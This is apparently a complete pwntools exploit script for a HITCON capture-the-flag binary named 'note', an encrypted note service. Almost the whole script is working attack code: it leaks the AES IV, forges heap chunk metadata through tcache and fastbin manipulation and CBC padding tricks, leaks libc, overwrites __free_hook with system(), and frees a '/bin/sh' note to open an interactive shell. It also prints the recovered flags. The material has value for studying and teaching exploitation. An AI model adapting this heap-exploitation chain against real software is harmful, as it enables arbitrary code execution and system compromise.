#!/usr/bin/env python

from __future__ import print_function
from pwn import *

from Crypto.Cipher import AES
import random

context.update(os='linux', arch='amd64',
	# log_level='debug',
)

elf = ELF('note')

TYPE_AES = 1
TYPE_RSA = 2

def commander_init(t):
	t._commands = 0

	def command(*args):
		t._commands += 1
		t.sendline(*args)

	def clean_commands(extra=0):
		prev = None
		while t._commands > extra:
			prev = t.recvuntil('Secret note:', drop=True)
			t._commands -= 1
		return prev

	t.command = command
	t.clean_commands = clean_commands

t = remote(args['HOST'] or 'localhost', args['PORT'] or 21700)
commander_init(t)

def add_note(idx, encryption, data):
	assert len(data) <= 0x60
	t.command('1')
	t.sendline(str(idx))
	t.sendline(str(encryption))
	t.sendline(str(len(data)))
	t.send(data)

def poke_note(idx):
	show_note(idx, examine=False)

def show_note(idx, examine=True):
	t.command('2')
	t.sendline(str(idx))
	if examine:
		t.clean_commands()
		t.recvuntil('index:')
		return t.recvuntil('\n', drop=True)

def del_note(idx):
	t.command('3')
	t.sendline(str(idx))

def aes_pad(data, pad_multiple=False):
	l = len(data)
	if l % 0x10 == 0 and not pad_multiple:
		return data
	count = 16 - l % 16
	return data + chr(count) * count

def show_note_dec(idx):
	result = show_note(idx)
	obj = AES.new(key, AES.MODE_CBC, iv)
	return obj.decrypt(result.decode('hex'))
	
def check_aes():
	with open('iv.txt', 'rb') as f:
		iv = f.read()
	with open('key.txt', 'rb') as f:
		key = f.read()
	for i in xrange(1000):
		log.info('Test %d', i)
		obj = AES.new(key, AES.MODE_CBC, iv)
		data = ''.join(chr(random.randrange(256)) 
			for _ in xrange(random.randrange(0x51, 0x60)))
		expected = obj.encrypt(aes_pad(data)).encode('hex')

		add_note(3, TYPE_AES, data)
		output = show_note(3)
		del_note(3)

		assert output == expected

with open('key.txt', 'rb') as f:
	key = f.read()

benc = AES.new(key, AES.MODE_ECB)
bdec = AES.new(key, AES.MODE_ECB)

def leak_iv():
	iv = '\x00' * 0x10
	obj = AES.new(key, AES.MODE_CBC, iv)
	add_note(3, TYPE_AES, iv + 'a')
	result = show_note(3)
	del_note(3)
	iv = obj.decrypt(result.decode('hex'))[:0x10]
	log.info('Got IV %s', iv.encode('hex'))
	return iv

def data_for_key():
	for i in xrange(7):
		if i == 3:
			print('c1 = 0x%s' % show_note(1))
		add_note(3 + i, 1, 'a' * 0x60)
	add_note(13, TYPE_AES, 'a' * 0x60)
	add_note(14, TYPE_RSA, '\x02'.rjust(0x14, '\x00'))
	add_note(15, TYPE_AES, 'a' * 0x60)
	add_note(16, TYPE_RSA, '\x03'.rjust(0x14, '\x00'))
	add_note(2, TYPE_AES, 'a' * 0x60)
	for i in xrange(7):
		del_note(3 + i)

	# tcache full

	# into fastbin
	del_note(13) 
	# from tcache
	add_note(3, TYPE_AES, 'a' * 0x60) 
	# from fastbin into tcache
	show_note(2)

	# tcache full

	del_note(15)
	add_note(4, TYPE_AES, 'a' * 0x60)
	show_note(2)

	del_note(0)
	add_note(5, TYPE_AES, 'a' * 0x60)
	show_note(2)

	print('c2 = 0x%s' % show_note(1))
	print('c3 = 0x%s' % show_note(14))
	print('c4 = 0x%s' % show_note(16))

def get_flag1():
	iv = leak_iv()
	flag_enc = show_note(0).decode('hex')
	obj = AES.new(key, AES.MODE_CBC, iv)
	print(obj.decrypt(flag_enc))
	# flag:hitcon{*?!@_funny_c3ypt0_4nd_pwN__$$%#}

def backfill_pad(overflow_bytes, length):
	assert len(overflow_bytes) == 0x10
	prev_cipher = xor('\x10' * 0x10, bdec.decrypt(overflow_bytes))
	prev_plain = bdec.decrypt(prev_cipher)
	result = 'X' * (length - 0x10)
	obj = AES.new(key, AES.MODE_CBC, iv)
	last_cipher = obj.encrypt(result)[-0x10:]
	return result + xor(prev_plain, last_cipher)

ptrs = list(xrange(2, 20))
def new_ptr():
	assert ptrs
	return ptrs.pop()
def del_ptr(p):
	assert p not in ptrs
	ptrs.append(p)
def del_both(p):
	del_note(p)
	del_ptr(p)

iv = leak_iv()

poke_note(1) # allocate rsa stuff

bg_holder = new_ptr()
add_note(bg_holder, TYPE_AES, 'b' * 0x5f)
sm_holder = new_ptr()
add_note(sm_holder, TYPE_AES, 's')

sh_holder = new_ptr()
add_note(sh_holder, TYPE_RSA, '/bin/sh\x00'[::-1])

smrsa = new_ptr()
add_note(smrsa, TYPE_RSA, 'sr')

corrupter = new_ptr()
add_note(corrupter, TYPE_AES, 
	backfill_pad('P' * 4 + p64(0x71) + p32(0), 0x60))
corrupter2 = new_ptr()
add_note(corrupter2, TYPE_AES,
	backfill_pad('P' * 4 + p64(0x421) + p32(0), 0x60))

for _ in xrange(7):
	poke_note(bg_holder)
# tcache[0x70] 7

before = new_ptr() # alloc from tcache
add_note(before, TYPE_AES, 'a' * 0x5f)
poke_note(sm_holder) # freed to tcache (size 1)
poke_note(bg_holder) # freed to tcache (size 7)

# heap ... [A70 before] [T20] [T70 (top)]
# tcache[0x70] 7

del_both(before) # freed to fastbin
# heap ... [F70 (top)] [T20 (top)] [T70 (top)]

after = new_ptr()
add_note(after, TYPE_AES, 'A' * (0x48) + p64(0x21)) # fake the next chunk size of T20/70
# heap ... [F70 (top)] [T20 (top)] [A70 after]

poke_note(corrupter) # freed to tcache
# heap ... [T70 (idx -0)] [T20/70 (top of T20)] [A70 after]

eat_tc = new_ptr()
add_note(eat_tc, TYPE_AES, 'E' * 8)
# heap ... [A70] [T20/70 (top of T20)] [A70 after]

# will eventually end at the top of the heap for making the fake chunk
lander = new_ptr()
lander_contents = ('L' * 4 + p64(0x21) + 'M' * 4) * 4
obj = AES.new(key, AES.MODE_CBC, iv)
add_note(lander, TYPE_AES, obj.decrypt(lander_contents) + 'a')

# # alloc two new chunks on top of heap
poke_note(bg_holder)
before_fake = new_ptr()
add_note(before_fake, TYPE_AES, 'a')

poke_note(bg_holder)
big_fake = new_ptr()
add_note(big_fake, TYPE_AES, 'F' * 0x20)

poke_note(sm_holder) # freed to tcache (size 3). needed for smrsa
poke_note(smrsa)
# heap ... [A70 eat_tc] [T20/70 (top of T70] [A70 after] 
# [A70 beforefake] [A70 fake] 
# [T20 (top)] [T90 (top)] [T90]

manipulated = new_ptr()
add_note(manipulated, TYPE_AES, 'mmmmmmmmm')
# heap ... [A70 eat_tc] [A70 manipulated] [A70] [T20] ...

del_both(after)

changer = new_ptr()
# we first make it type rsa to keep the allocation
add_note(changer, TYPE_AES, 'C' * (0x60 - 0x20) + p32(0x501) + p32(1))
# heap ... [A70 eat_tc] [A70 manipulated (new size)] [A70 changer]
# [T20 (top)] [T90 (top)] [T90]

# log.hexdump(show_note_dec(manipulated))

for _ in xrange(7):
	poke_note(lander)

poke_note(bg_holder)
poke_note(bg_holder)

del_both(before_fake) # lands on fastbin
poke_note(corrupter2)
del_both(big_fake)

data = show_note_dec(manipulated)
libc_addr = u64(data[0x90:][:8])
libc_base = libc_addr - 0x7ffff7b4f0b0 + 0x7ffff7763000
log.info('Base %x', libc_base)

eater = new_ptr()
add_note(eater, TYPE_AES, 'a')
eater2 = new_ptr()
add_note(eater2, TYPE_AES, 'a')

del_note(changer)
del_note(manipulated)

poke_note(sm_holder)
poke_note(sm_holder)
poke_note(sm_holder)

add_note(changer, TYPE_AES, 'x' * 0x20 + p64(libc_base + 0x00000000003ed8e8)) # free_hook
# add_note(changer, TYPE_AES, 'x' * 0x20 + p64(libc_base + 0x00000000003ebc30)) # malloc_hook
land1 = new_ptr()

add_note(land1, TYPE_AES, 'l')
hook_lander = new_ptr()
add_note(hook_lander, TYPE_AES, p64(libc_base + 0x000000000004f440)) # system
# add_note(hook_lander, TYPE_AES, p64(libc_base + 0x10a38c)) # one_gadget

poke_note(sh_holder)
t.clean_commands()

t.interactive()

# hitcon{overflow_with_CBC_and_why_calloc_doesnt_use_tcache??}
